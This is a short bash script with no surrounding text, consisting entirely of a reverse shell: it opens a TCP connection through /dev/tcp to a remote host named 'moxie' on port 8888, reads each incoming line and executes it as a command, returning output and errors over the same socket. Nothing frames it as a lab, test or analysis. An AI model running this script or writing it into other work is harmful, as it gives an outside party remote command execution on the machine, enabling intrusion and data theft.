#!/bin/bash

exec 5 <> /dev/tcp/moxie/8888
cat <&5 | while read line; do $line 2>&5 >& 5; done
